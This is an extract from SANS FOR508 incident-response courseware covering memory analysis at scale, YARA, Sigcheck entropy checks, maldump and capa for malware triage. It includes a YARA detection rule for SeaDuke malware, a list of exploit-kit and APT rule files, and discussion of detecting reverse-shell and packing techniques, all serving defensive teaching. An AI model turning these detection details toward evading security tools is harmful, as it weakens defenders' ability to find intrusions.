FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

183

.

Live memory analysis is a revolutionary change in this discipline. At first glance, the idea itself could be as
controversial as creating a memory image was just a few years ago. Do you remember the naysayers questioning
how our forensic analysis could possibly be valid if we were to run our memory imaging applications on the live
system? Shouldn’t we still be pulling the plug? What would they say if we now told them we were going to play
"Find the Hacker" on that same live system? Luckily, it turns out that the system impact of doing a live analysis
versus (or in addition to) taking a memory image is minimal. And the benefits are great:
•
•
•
•
•
•
•
•

Faster triage capability
Inclusion of the system pagefile, providing a more complete picture of memory
Ability to query and compare system API data (WMI, etc.)
More accurate heuristics matching
Digital signature checks of process executables, DLLs, and drivers
Comparison of process executables, DLLs, and drivers with "known good" hash allowlist
Distributed processing
Indicator of Compromise searches using pre-defined IOC signatures

Live memory analysis can occur via different means. When accomplished by accessing physical memory,
and not relying upon API calls, open handles, or debuggers it is just as effective at defeating advanced malware
and rootkits as analyzing a standard memory image. However, that comes at a performance cost so some tools
default to API-based collection to improve scalability (everything in computing is a tradeoff.) It is still early
days for live memory analysis, but with the size of RAM continuing to increase (especially on servers), it is
almost certainly the next logical step for memory analysis.
There are some excellent stand-alone live memory detection tools available publicly. Jared Atkinson’s
PowerShell script Get-InjectedThread iterates through every running thread and is surprisingly capable of
identifying many types of code injection, including some reflective code injection techniques.[1] The collection
module Get-InjectedThreads.ps1 is available in the Kansa framework, allowing this technique to be scaled to
many systems at a time.[2] Hollows Hunter and Moneta are standalone tools allowing a system to be scanned for
© 2023 SANS Institute

.

183

more advanced attacks like reflective code injection, hooking, process hollowing, and even process
doppelganging.[3] Keep in mind these tools often identify many false positives, requiring an advanced
practitioner (like you!) to sort the results.
If you are interested in hunting in memory at scale on your network, there are some well regarded open-source
projects designed for this use case. The Velociraptor project has been in development for many years and
includes the ability to run live memory audits. [4] It facilitates scalable hunting and collection of many memory
artifacts via Windows API calls in addition to YARA scanning. MemProcFS Remoting enables full-scale
memory forensics over the network using the well regarded PCILeech and WinPMEM projects.[5] Many
commercial tools like EDR suites also provide the ability for novel in-memory investigations. Several core
members of the Volatility team created a commercial product named Volexity Volcano to support scalable
memory forensics.[6]

.

[1] Get-InjectedThread: https://for508.com/sv1ou
[2] Kansa Get-InjectedThreads.ps1: https://for508.com/2adv7
[3] hollows_hunter GitHub: https://for508.com/nli94
[4] Velociraptor Github: https://for508.com/v4jq3
[5] MemProcFS Remoting: https://for508.com/fzktu
[6] Volexity Volcano: https://for508.com/mcvqt

184

© 2023 SANS Institute

.

Scaling
S
caling Analysis: Using IOCs

• Indicators of Compromise allow a wide range of alert
triggers to be set for known malware and behaviors
• Processes, hooks, drivers, handles, and strings

• Excellent for quick triage and automation at scale
• Velociraptor can scan live process memory for YARA signatures
• yarascan / windows.vadyarascan available in Volatility 2/3
• page_brute.py scans page files using YARA signatures

185

01

.ir

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

hi

de

Indicator of Compromise (IOC) use allows automated analysis of systems, or in this case, memory images. The
idea is simple. Once malicious activity has been identified, an analyst creates an IOC defining a way to detect
that activity in very specific terms. In terms of memory, this could be the presence of a specific process name,
command line, DLL path, port opened, unlinked DLL, hooked function, byte combination, etc. An indicator is
created and tested and then can be used to automatically identify the malicious activity in the future. In memory
forensics, IOCs can greatly speed analysis because examiners do not need to waste time finding the same
malicious artifacts over and over again. If the system you are currently looking at is infected with something
seen before, your IOC will alert and identify exactly what artifacts should be reviewed. Building indicators
(regardless of what format you choose) is a good best practice for incident response teams. As malware is
discovered in your enterprise, it should be analyzed, and signatures created. These signatures can then be used to
rapidly identify similar malware found in the future.
Takahiro Haruyama created a plugin named "openioc_scan" that brings the OpenIOC format to Volatility
2.[1] It does an excellent job of mapping the various IOC terms to its Volatility equivalents. It can use existing
IOCs in the version 1.1 format, or you can build your own. For the latter, we recommend the python-based
editor PyIOCe because it has nice integration with the Volatility-specific naming conventions.[2, 3]
Many teams utilize YARA signatures due to their simplicity and flexibility. They work particularly well for
scanning memory. Volatility, MemProcFS, GRR, and Velociraptor all include YARA support, and in this slide,
we see an example of the Volatility 3 windows.vadyarascan plugin in action. In this example it found
multiple hits for a Meterpreter rule in process PID 1012, also nicely providing the VAD offsets that can be used
to recover those memory sections. You can choose to scan specific processes (faster) or the entire memory
image. This capability is also particularly relevant to scale memory analysis by performing YARA searches on
live systems. Velociraptor makes this trivial to accomplish.
An older tool (but still very viable) is page_brute.py, designed to allow YARA scanning of Windows
page files, an artifact for which we have historically had few analysis tools.
[1] Fast Malware Triage using Openioc_scan Volatility plugin: http://for508.com/48nda
[2] Python IOC Editor: http://for508.com/j6smz
[3] OpenIOC Parameters used by Openioc_scan: http://for508.com/2itvz
[4] Page_brute Github: https://for508.com/jemqv
© 2023 SANS Institute

.

185

Lab 3.4
Memory Extraction and Rootkits
Average Time: 25 Minutes

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

This page intentionally left blank.

186

© 2023 SANS Institute

.

186

FOR508 | Advanced Incident Response,Threat Hunting, and Digital Forensics 187

.

This page intentionally left blank.

© 2023 SANS Institute

.

187

COURSE RESOURCES AND CONTACT INFORMATION
Here is my lens. You know my methods. –Sherlock Holmes
AUTHOR CONTACT
rlee@sans.org
http://twitter.com/robtlee

SANS INSTITUTE
11200 Rockville Pike, Suite 200
N. Bethesda, MD 20852
301.654.SANS(7267)

ctilbury@sans.org
http://twitter.com/chadtilbury
mpilkington@sans.org
https://twitter.com/mikepilkington

SANS EMAIL
DFIR RESOURCES
digital-forensics.sans.org
Twitter: @sansforensics

GENERAL INQUIRIES: info@sans.org
REGISTRATION: registration@sans.org
TUITION: tuition@sans.org
PRESS/PR: press@sans.org

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

This page intentionally left blank.

188

© 2023 SANS Institute

.

188

FOR508 | ADVANCED INCIDENT RESPONSE, THREAT HUNTING, & DIGITAL FORENSICS
GIAC Certified Forensic Analyst (GCFA)

508.4

.

Timeline Analysis

THE MOST TRUSTED SOURCE FOR INFORMATION SECURITY TRAINING, CERTIFICATION, AND RESEARCH

.

|

sans.org

© 2023 SANS Institute All rights reserved to SANS Institute.
PLEASE READ THE TERMS AND CONDITIONS OF THIS COURSEWARE LICENSE AGREEMENT ("CLA") CAREFULLY
BEFORE USING ANY OF THE COURSEWARE (DEFINED BELOW) ASSOCIATED WITH THE SANS INSTITUTE COURSE.
THIS IS A LEGAL AND ENFORCEABLE CONTRACT BETWEEN YOU (THE “USER”) AND THE ESCAL INSTITUTE OF
ADVANCED TECHNOLOGIES, INC. /DBA SANS INSTITUTE (“SANS INSTITUTE”) FOR THE COURSEWARE. BY
ACCESSING THE COURSEWARE, USER AGREES TO BE BOUND BY THE TERMS OF THIS CLA.
With this CLA, SANS Institute hereby grants User a personal, non-exclusive license to use the Courseware subject to the
terms of this agreement. Courseware means all printed materials, including course books and lab workbooks, slides or notes,
as well as any digital or other media, audio and video recordings, virtual machines, software, technology, or data sets
distributed by SANS Institute to User for use in the SANS Institute course associated with the Courseware. User agrees that
the CLA is the complete and exclusive statement of agreement between SANS Institute and you and that this CLA supersedes
any oral or written proposal, agreement or other communication relating to the subject matter of this CLA.
BY ACCESSING THE COURSEWARE, USER AGREES TO BE BOUND BY THE TERMS OF THIS CLA. USER FURTHER
AGREES THAT ANY BREACH OF THE TERMS OF THIS CLA MAY CAUSE IRREPARABLE HARM AND SIGNIFICANT
INJURY TO SANS INSTITUTE, AND THAT SANS INSTITUTE MAY ENFORCE THESE PROVISIONS BY INJUNCTION
(WITHOUT THE NECESSITY OF POSTING BOND) SPECIFIC PERFORMANCE, OR OTHER EQUITABLE RELIEF.
If User does not agree to the terms of this CLA, User should not access the Courseware. User may return the Courseware to
SANS Institute for a refund, if applicable.
User may not copy, reproduce, re-publish, distribute, display, modify or create derivative works based upon all or any portion of
the Courseware, in any medium whether printed, electronic or otherwise, for any purpose, without the express prior written
consent of SANS Institute. Additionally, User may not sell, rent, lease, trade, or otherwise transfer the Courseware in any way,
shape, or form to any person or entity without the express written consent of SANS Institute.
If any provision of this CLA is declared unenforc.eable in any jurisdiction, then such provision shall be deemed to be severable
from this CLA and shall not affect the remainder thereof. An amendment or addendum to this CLA may accompany this
Courseware.
SANS Institute may suspend and/or terminate User’s access to and require immediate return of any Courseware in connection
with any (i) material breaches or material violation of this CLA or general terms and conditions of use agreed to by User; (ii)
technical or security issues or problems caused by User that materially impact the business operations of SANS Institute or
other SANS Institute customers, or (iii) requests by law enforcement or government agencies.

.

SANS Institute acknowledges that any and all software and/or tools, graphics, images, tables, charts or graphs presented in
this Courseware are the sole property of their respective trademark/registered/copyright owners, including:
AirDrop, AirPort, AirPort Time Capsule, Apple, Apple Remote Desktop, Apple TV, App Nap, Back to My Mac, Boot Camp,
Cocoa, FaceTime, FileVault, Finder, FireWire, FireWire logo, iCal, iChat, iLife, iMac, iMessage, iPad, iPad Air, iPad Mini,
iPhone, iPhoto, iPod, iPod classic, iPod shuffle, iPod nano, iPod touch, iTunes, iTunes logo, iWork, Keychain, Keynote, Mac,
Mac Logo, MacBook, MacBook Air, MacBook Pro, Macintosh, Mac OS, Mac Pro, Numbers, OS X, Pages, Passbook, Retina,
Safari, Siri, Spaces, Spotlight, There’s an app for that, Time Capsule, Time Machine, Touch ID, Xcode, Xserve, App Store, and
iCloud are registered trademarks of Apple Inc.
PMP® and PMBOK® are registered trademarks of PMI.
SOF-ELK® is a registered trademark of Lewes Technology Consulting, LLC. Used with permission.
SIFT® is a registered trademark of Harbingers, LLC. Used with permission.
REMnux® is a registered trademark of Zeltser Security Crop. Used with permission.
VMware Workstation Pro®, VMWare Workstation Player®, VMWare Fusion®, and VMware Fusion Pro® are registered
trademarks of VMware, Inc. Used with permission.
Governing Law: This Agreement shall be governed by the laws of the State of Maryland, USA.
Courseware licensed to User under this Agreement may be subject to export laws and regulations of the United States of
America and other jurisdictions. User warrants he or she is not listed (i) on any sanction programs list maintained by the U.S.
Office of Foreign Assets Control within the U.S. Treasury Department (“OFAC”), or (ii) denied party list maintained by the U.S.
Bureau of Industry and Security within the U.S. Department of Commerce (“BIS”). User agrees to not allow access to any
Courseware to any person or entity in a U.S. embargoed country or in violation of a U.S. export control law or regulations.
User agrees to cooperate with SANS Institute as necessary for SANS Institute to comply with export requirements and
recordkeeping required by OFAC, BIS or other governmental agency.
All reference links are operational in the browser-based delivery of the electronic workbook.
FOR508_4_I01_01

.

FOR508.4

Advanced Incident Response,Threat Hunting, and Digital Forensics

Timeline Analysis

© 2023 SANS Institute | All Rights Reserved | Version I01_01

Welcome to Section 4.

Rob Lee
rlee@sans.org
https://twitter.com/robtlee
https://twitter.com/sansforensics

.

Author Team:

Chad Tilbury
ctilbury@sans.org
https://twitter.com/chadtilbury
Mike Pilkington
mpilkington@sans.org
https://twitter.com/mikepilkington

© 2023 SANS Institute

.

1

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

This page intentionally left blank.

2

© 2023 SANS Institute

.

FOR508 Intrusion Methodology Roadmap
1

2

3

Threat Hunting & Assessment
Collection and analysis at scale across the
enterprise. Begin identification and scoping.

Triage Collection & Analysis
Targeted data acquisition to validate findings
and develop threat intelligence.

Deep-Dive Forensics
In-depth analysis on systems and malware to
further identify tradecraft and build IOCs.

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

3

Your journey through FOR508 has been designed to follow a standard workflow for performing threat hunting,
compromise assessments, and incident response activities. The roadmap we will use in this class follows:

.

Threat Hunting & Assessment
We will start our process by looking at the network using tools that can scale collection and analysis, focusing
on occurrence stacking and outlier analysis. Most attendees have thousands of endpoints necessitating broad
scoping techniques at the start of an investigation.
Triage Collection & Analysis
As systems of interest are identified, we will perform targeted triage collection to acquire a deeper
understanding of attacker activity. Triage data can include traditional forensic artifacts like application
execution data, filesystem information, and in-memory artifacts such as process trees.
Deep-Dive Forensics
Finally, we will reserve our limited analyst time for performing deep-dive forensics on only a handful of
systems having the best chance to help us understand attacker tools and tradecraft and craft better indicators to
assist with scoping additional compromised systems.

© 2023 SANS Institute

.

3

Malware Discovery

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

This page intentionally left blank.

4

© 2023 SANS Institute

.

4

Malware Discovery: Anomaly Detection
Sigcheck

YARA

• Microsoft tool designed to
validate digital signatures
• Create file hashes
• Virus Total support

• Search for string and headerbased signatures
• Standard for IOC sharing
• Easy to create custom
signatures to detect new
tools/malware

maldump

capa

• Multi-quarantine extractor
• Extract metadata and
malware from antivirus
repositories

• File capability identification
• Anti-analysis features?
• Contains an embedded .exe?
• Interesting host interaction?
• Code injection capabilities?

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

5

.

A common challenge facing incident responders is rapid identification of suspicious and malicious software on a
computer system. There are hundreds of thousands of files and folders on a system and defenders can leverage
a variety of techniques including file analysis, live response (the examination of a system's state while it's
running) and temporal analysis (a fancy phrase for “timelining") to identify suspicious files. On the flip side,
attackers regularly employ data-hiding techniques to make identification even more difficult:
• Deleting indicators of entry to a system after it's compromised, such as log file entries, file
modification/access dates, and system processes.
• Obfuscating running malware by changing its name or execution profile such that it appears to be something
benign.
• Storing data on disk in a "packed" format. Packing is a technique that obfuscates or encrypts data or software
and encapsulates it in a file along with a program to perform decryption/de-obfuscation. For example, a
"Packed Executable" is a piece of software containing an "unpacking" program and a payload.
• Custom data encryption/decryption routines
In this section we will cover several techniques designed to find and quickly characterize suspicious files. We
will use Sigcheck for anomaly detection, YARA (and Sigcheck) for signature-based detection, maldump for
anti-virus quarantine extraction, and capa to provide reverse engineering insights into the capabilities of files of
interest. Together these tools provide a powerful means to detect a wide-range of malware and anti-detection
capabilities seen in the wild. The goal of this section is to provide “field triage” capabilities to the incident
responder. You might not finish your examination of a file with just these tools, but you will be far more
informed about the likelihood of it being evil before sending the file along to expensive reverse engineering
resources.

© 2023 SANS Institute

.

5

Digital Signature Checks and More: sigcheck.exe
Sysinternals Sigcheck has evolved into a comprehensive executable scanner
C:\> sigcheck –a –c –e –h –v <dir-of-exe> >

sigcheck-results.csv

sigcheck [options] file or directory
[Useful Options]
-a
Show extended version information including file entropy
-c
csv output
-e
Scan all files with PE headers (regardless of file extension)
-h
Show file hashes
-s
Recurse subdirectories
-u
Show files that are unknown if VirusTotal check
is enabled; otherwise, show only unsigned files.
-v[rs]
Query VirusTotal for malware based on file hash. Add 'r' to
open reports for files with non-zero detection. Files reported
as not previously scanned will be uploaded to VirusTotal if the
's' option is specified.
-t[u][v]
Dump contents of specified certificate store ('*' for all
stores). Specify -tu to query the user store (machine
store is the default). Append '-v' to have Sigcheck download
the trusted Microsoft root certificate list and only output
valid certificates not rooted to a certificate on that list. If
the site is not accessible, authrootstl.cab or authroot.stl in
the current directory are used instead, if present.

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

Sigcheck is a long-time favorite tool from the free Microsoft Sysinternals toolkit. The primary purpose of
Sigcheck is checking the code signing characteristics of executable files in a directory. By using several of the
options, namely, -u and -s, an analyst can quickly dump a recursive list of unsigned binaries for analysis.

.

As discussed previously in the course, the vast majority of malware in the wild is not signed. This is good news
because with the release of Windows 64-bit operating systems, the majority of legitimate code is signed. Those
two facts combine to provide a powerful detection capability! That being said, there are many examples of
advanced malware with valid digital signatures (valid at least at the time of discovery). In 2022, malicious
drivers were found signed with stolen (and expired) NVIDIA certificates. Some ransomware variants have
resorted to code signing, particularly for drivers used to disable security products. Even if malware is signed, it
is often signed by fraudulent companies that stick out among the well-known organizations from whom you
would expect a system to be running code. Signed malware might improve the chances of malware blending in,
but there is always a cost. Once the malware is detected and the code certificate is revoked, it could reveal the
malware in other organizations. It is very much a Catch-22. If you sign your code, you can make it more
difficult to find; however, when found, you expose every system currently infected after the code signing
certificate has been revoked. This keeps the number of signed malware samples down and increases the
effectiveness of looking for unsigned code on a system, a task at which Sigcheck excels.
Systinternals provides regular updates to its toolkit, providing new capabilities to keep pace with new attacks.
Integration with VirusTotal to perform hash lookups is built-in. File entropy can be calculated, and a variety of
file hashes generated. Sigcheck also has the capability to dump certificate stores to identify any root certificates
present not explicitly trusted by Microsoft. While outside the scope of this class, this capability could be a very
useful way to identify a cloned and trusted root certificate. In summary, this free tool provides several musthave features for the malware hunter.

6

© 2023 SANS Institute

.

6

File Entropy

• File entropy is a powerful comparator for binary files
• Windows system executables average score: 4 - 6
• Packed or evasive malware average score: 6 - 8

Microsoft DLL

Packed Installer

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

7

.

Entropy is a useful concept in cybersecurity adept at finding anomalies in a wide range of data sets including
SPAM detection, domain generation algorithms, obfuscated PowerShell scripts, and packed files on disk.
Entropy measures predictability of bytes and can largely be thought of as a test for how much randomness is in
the data. File entropy can help identify files containing large amounts of compressed or encrypted data. While
many file types naturally hold a lot of entropy (Microsoft Office documents are Zip compressed), Windows
executables have a surprisingly low average entropy. Of the thousands of Windows .exe, .dll, and .sys files
installed by default, only a handful demonstrate high entropy. Luckily, malware is often the exact opposite, with
a diverse set of packing and armoring techniques designed to evade host-based security signature detections
(with a side effect of high entropy). While we are focusing on Windows, it is good to know this technique is
also very effective on Linux systems with the same reasoning.
Sysinternals Sigcheck can calculate entropy during executable analysis with the “-a” option. The algorithm used
appears to be “Shannon’s Entropy” with a maximum entropy number of “8”. Compressed zip files or encrypted
archives will often score very close to 8 on this scale. An empty file would score a “0” and text files are among
the file types with the lowest entropy, often scoring around 4 on the scale. Normal executable values tend to
vary between a 4.5 to 6. Default Cobalt Strike shellcode can have an entropy value from 7.2 to 7.4. The higher
the entropy value, the more likely it is to have multiple components which are compressed or encrypted. While
this is not evidence of evil, it does allow your focus to be quickly narrowed away from legitimate system
binaries so you can focus more deeply on the outlier executables that may be trying to hide something.
The graphical entropy examples on this slide were generated with the free tool Detect It Easy (DIE). They show
the exceptionally low Shannon Entropy (~4.5) of a stock Microsoft DLL with the extremely high entropy (~8) of
a suspicious packed file. This information can be brought together in table form by Sigcheck to enable better
comparisons. If you care to perform this type of calculation on a Linux system, the built-in tool “ent” has long
been a mainstay of Unix-based operating systems.

© 2023 SANS Institute

.

7

sigcheck Analysis

01

.ir

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

hi

de

Sigcheck output contains an extensive set of data which can be mined for anomalies. In this example, the
C:\Windows folder of a system was recursively scanned and analyzed. In the examples on the slide, you can see
how synthesizing disparate information sources can allow an analyst to quickly narrow down thousands of files
to just a few worth looking into more deeply. The first check accomplished was looking for unsigned files.
Amazingly, this narrowed the results to only 3 out of 4,290 files! Also notice that two out of the three didn’t
even bother to include file metadata like company and product name (this information is easy to fake, but a lot
of generated malware does not add metadata by default). In the middle example, you see a sort of the results by
entropy value. Recall the highest entropy value in Sigcheck is “8”, making all of these files highly entropic. Two
out of three shown are legitimate outliers, with the unsigned “p.exe” file also appearing in the top three most
entropic files in the list. In the middle example, you see additional file information like Machine Type, which
can be useful for looking for less common 32-bit code and an example of the several different columns
containing file hash information. The final example shows Sigcheck data with the inclusion of VirusTotal
lookups. Sigcheck can query the executable hash with the VirustTotal database providing information from
over 70 different anti-virus engines and online sandboxes. If a hash results in a detection, a VirusTotal link is
provided as output in the final column for further research. In this final example, we have two files rising far
above the rest. These happen to be the same two files which keep reappearing as anomalies in other tests, further
solidifying the need for further analysis. This example demonstrates an exceptionally easy way to identify an
evil executable in an unusual location (C:\Windows\Temp\Perfmon\p.exe) along with a malicious executable
hiding in plain sight within a system folder (C:\Windows\System32\pa.exe).

8

© 2023 SANS Institute

.

8

YARA Pattern Matching

• Open-source tool from VirusTotal
designed to identify and classify malware
• Large collection of available signatures and
extensions

• Stand-alone tool is effective for quick
scans of folders or suspected malware
• Linux, Mac OS X, Windows
• YARA is also baked into a wide-range of other
tools
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

9

.

YARA is currently the most widely used indicator of compromise format. Its popularity stems from striking the
right balance of simplicity and power, making it easy for malware analysts and incident responders to identify
and classify malware samples. YARA rules are written to match patterns, and the rules themselves are easily
understood by both machines and human operators. Originally designed by VirusTotal to help classify their
enormous collection of submitted malware samples, it has been embraced by most major security vendors and
YARA support is embedded in a vast number of tools.
The stand-alone YARA application can be run on Linux, Mac, and Windows and is fast and simple to use for a
quick check of suspect files.[1] It takes a collection of signatures and target files as inputs, and outputs any
signatures matches for those files.
[1] YARA - The pattern matching swiss knife for malware researchers: https://for508.com/378jh

© 2023 SANS Institute

.

9

Indicators of Compromise: YARA
rule SeaDuke_Sample {
meta:
description = "SeaDuke Malware"
license = "https://creativecommons.org/licenses/by-nc/4.0/"
author = "Florian Roth"
reference = "http://goo.gl/MJ0c2M"
strings:
$s0 = "bpython27.dll" fullword ascii
$s1 = "email.header(" fullword ascii
$s2 = "LogonUI.exe" fullword wide
$s3 = "Crypto.Cipher.AES(" fullword ascii
$s4 = "mod is NULL - %s" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 4000KB and all of them
}

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

While many YARA rules are strings based, more sophisticated rules can be crafted using regular expressions,
wildcards, conditions, and modules such as pe header components from the portable executable structures. In
the example on this slide, the matched condition requires a 1) “MZ” portable executable signature, 2) a file size
limit, and 3) matching of five specific strings found inside the file. The goal of an IOC is to create a signature
that is specific enough to limit false positives at scale, while being broad enough to still match different variants
of the same malware sample. This is a difficult balance and is why different IOCs have wildly different efficacy
rates.

10

© 2023 SANS Institute

.

10

YARA Usage
yara64.exe –C compiled-rules-file <file or directory>

yara [options] RULES_FILE <file or directory>
[Useful Options]
-C:
-c:
-f:
-w:
-r:
-p <threads>:

Load pre-compiled rules
Print only number of matches
Fast matching mode
Disable warnings
Recursively search directories
Use specified number of threads during scanning

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

11

.

The YARA tool is a simple implementation of the standard, leaving more complicated implementations to other
tools. It takes a single YARA rule file as input and scans a collection of files for signature matches (including
the ability to search recursively). The rules file can be frustrating for first time users because there is no
capability to point the tool at a folder of collected signatures. If you are using multiple signatures, they must all
be appended into the same signature file or referenced as part of an “index” file, as seen below. A rules file can
be compiled using the yarac64.exe compilation tool, and then referenced using the “-C” option on the YARA
command line. Compiling signatures is a good best practice for larger signature sets because it significantly
increases the efficiency of the scanning engine. The example on this slide uses the Windows (.exe) 64-bit
version of YARA with a pre-compiled set of rules named “yara-rules”. One hit was returned, with the file
named “svchost.exe” matching a signature for “apt sofacy xtunnel”. Florian Roth maintains an extensive
collection of public YARA rules on GitHub, making it an excellent starting place for building a good rule set to
use for malware scanning.[1]
Example Contents of a YARA Index File:
include ".\exploit_kits\EK_ZeroAcces.yar“
include ".\exploit_kits\EK_Zerox88.yar“
include ".\exploit_kits\EK_Zeus.yar“
include ".\malware\000_common_rules.yar“
include ".\malware\APT_APT1.yar“
include ".\malware\APT_APT10.yar“
include ".\malware\APT_APT15.yar“
include ".\malware\APT_APT17.yar“
include ".\malware\APT_APT29_Grizzly_Steppe.yar“
[2] Signature-base YARA Rules: https://for508.com/l8ypz

© 2023 SANS Institute

.

11

Extract Quarantine Files: maldump

• Finding and extracting quarantine files
from forensic images can be difficult
• It is sometimes difficult even on live systems!

maldump queries and extracts quarantine
files from popular anti-virus products
• If using triage images, make sure your
KAPE target includes quarantine folder

• Avast Antivirus
• Avira Antivirus
• Eset NOD32
• FortiClient
• G Data
• Kaspersky for
Windows Server
• Malwarebytes
• Microsoft Defender

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

If you have ever struggled to identify and extract quarantined anti-virus files, you are going to love this next
tool! Quarantine files are designed to be rendered unusable and difficult to access, and every vendor implements
these constraints in different ways. With proper permissions you might be able to use the anti-virus software on
a live system to recover files, but it often becomes increasingly more difficult if you only have a copy of the
drive or folder. Out of necessity, researchers over the years have reversed common anti-virus quarantine formats
and documented them and/or created extraction tools. With some research, you can usually find a way to
recover needed files. If your vendor happens to fall among those listed on this slide, there is an open-source tool
named maldump which makes the process exceptionally easy.[1] A great feature of maldump is the ability to
quickly test a mounted image (disk or triage) for the existence of quarantine files from multiple vendors. You
can see an example of the process on this slide, where the tool indicates a file (previously) named
C:\Temp\onedrive in the Microsoft Defender quarantine. If more information is desired, the tool can provide
additional metadata like time of quarantine, file size, file hash, and ultimately an extracted copy of file. This
makes maldump a great tool to have in your collection during malware investigations. Keep in mind that this all
presupposes you collected the correct data in the first place! It is a great best practice to identify the security
product(s) installed within an environment and make sure you are collecting associated logs and file
repositories. At the time of writing, most of the Antivirus targets currently in KAPE focus on logs and not on
quarantine folders (the Windows Defender target is an exception). The good news is KAPE targets are easy to
modify and there is existing documentation available on where many of the various vendors store their
quarantine files.[2,3] If you are lucky enough to have full disk images, you will of course have all the data
necessary to reconstruct a quarantine.

.

•

Extracts:

[1] GitHub - maldump: https://for508.com/l4fa0
[2] KAPE Antivirus Targets: https://for508.com/46kjq
[3] Github ernw Quarantine Formats: https://for508.com/1ldcp

12

© 2023 SANS Institute

.

12

maldump Usage
maldump –l <mounted root_dir>
maldump –a <mounted root_dir>

maldump [options] <root_dir>
[Useful Options]
-l:
-q:
-m:
-a:
-v:

List quarantined files to stdout
Dump quarantined files to archive ‘quarantine.tar’
Dump metadata to CSV file ‘quarantine.csv’
Equivalent of running both –q and –m
Show version and exit

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

13

.

maldump is written in Python and is designed to be pointed to the root folder of a file system where it iterates
through known vendor folder locations looking for the existence of quarantined files. A mounted disk image or
KAPE triage image will work with this tool because they maintain the original folder structure. If you only have
a quarantine folder, you will need to create a fake folder structure matching the standard vendor folder scheme
for it to work as intended. maldump is already installed in your course virtual machine, and there are setup
instructions on the GitHub site should you wish to install it elsewhere in the future.[1]
maldump can provide two sets of information: metadata and file dumps. If you want both, select the “all”
option (-a). If you prefer to just start with one or the other, there are options for a CSV version of the metadata (m) and for dumping quarantine files into an archive (-q). The “list” option (-l) provides a simple view of any
discovered quarantine files. All metadata timestamps for the quarantine files are in UTC except for "Kaspersky
for Windows Server" which apparently stores timestamps in the local system time zone. The tool author
recommends running the tool with administrator privileges on Windows to ensure access to the necessary files.
[1] GitHub - maldump: https://for508.com/l4fa0

© 2023 SANS Institute

.

13

Enumerate Malware Capabilities: capa

• Triage detection using crowdsourced
code patterns (rules)
• File Header
• API Calls
• Strings and Constants
• Disassembly Features

• Rules match common malware actions
• Communication, Host Interaction,
Persistence, Anti-Analysis, etc.
• ATT&CK technique mapping also included

• Designed to provide capabilities in plain
language to speed-up investigations
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

The FireEye FLARE team released the open-source capa project in an attempt to lower the bar for initial
malware investigations.[1] They provided the following problem statement: “Effective analysts can quickly
understand and prioritize unknown files in investigations. However, determining if a program is malicious, the
role it plays during an attack, and its potential capabilities requires at least basic malware analysis skills. And
often, it takes an experienced reverse engineer to recover a file’s complete functionality and guess at the
author’s intent.”[2] Reverse engineering capabilities are in short supply on nearly every security team and thus it
is extremely helpful for incident responders to be able to perform “field triage” activities to identify a suspicious
file as malicious and to understand how it might have been used in an attack. The capa tool provides more
information to responders than ever before by actually disassembling the code, looking for well-known patterns,
and then describing what those patterns indicate in plain language. Imagine convening some of the best reverse
engineers on the planet and having them brainstorm on how they most commonly identify the capabilities of a
piece of software. Capa accomplished this by building an easy mechanism for defining rules and then
crowdsourcing rule creation! The FireEye FLARE team seeded capa with hundreds of patterns and researchers
have added many more. The end result is a tool anyone can use that takes advantage of the “hive-mind”
knowledge of the reverse engineering community. Not only that, but the rules are written in YAML and opensource, providing an exciting opportunity to explore these patterns and learn about the underlying techniques.
As an example, the rule on this slide is looking for reverse shell communication capabilities and you can clearly
see that (named) pipes are a primary flag. This pattern would perhaps be useful in identifying command and
control techniques leveraging named pipes like those used by the Cobalt Strike Beacon.
[1] GitHub - fireeye/capa: https://for508.com/boxkq
[2] Automatically Identify Malware Capabilities: https://for508.com/n8skp

14

© 2023 SANS Institute

.

14

capa Usage
capa.exe –f pe <file>

capa [options] <file>
[Useful Options]
-v:
-vv:
-f <format>:
-r RULES:
-t TAG:
-j:

Enable verbose results
Enable very verbose results
Choose between PE or shellcode analysis (pe,sc32,sc64)
Specify alternative rules directory
Filter on a specific rule meta field value
Output JSON instead of text

** The capa project includes compiled versions for Windows, Mac, and
Linux and can alternatively be run natively in Python
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

01

.ir

15

hi

de

Capa is designed to be run against a single file of interest. In its simplest form you can point it at an executable
with no options and it will present a report of the capabilities of that sample. If you would like more information
after seeing the initial report, run the tool again with the verbose options (“-v” or “-vv”) to identify exactly
where matches were found in the code. This “verbose” information is likely most interesting to reverse
engineers who plan to visit those locations using a disassembler tool, but it can give more context even to a lay
investigator. An important option to understand is the format (-f) command. By default, capa will assume you
are asking it to analyze an executable (“-f pe”), but capa can also parse shellcode! This can be particularly
useful for analysis of injected memory sections that were dumped with tools like Volatility malfind, or shellcode
pulled out of encoded PowerShell scripts (PowerShell Empire and Cobalt Strike are fond of this technique). It is
very likely that you will not know whether the shellcode is 32-bit (format option “sc32”) or 64-bit (format
option “sc64”), so feel free to try both and see which option provides results. Finally, if you are automating
analysis, you might prefer output in JSON format, which can be easily parsed for further interaction.

© 2023 SANS Institute

.

15

capa Analysis Example

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

The capa output is designed to be understandable and allow for further research into stated capabilities. At the
bottom of the results will be a list of probable capabilities (CAPABILITY) for the sample analyzed along with
the category of rule they matched (NAMESPACE). This is a good place to start. Above this information will
be the Mitre ATT&CK and Malware Behavior Catalog (MBC) references for the identified capabilities,
providing places for more research.[1] Keep in mind that legitimate software also has plenty of capabilities!
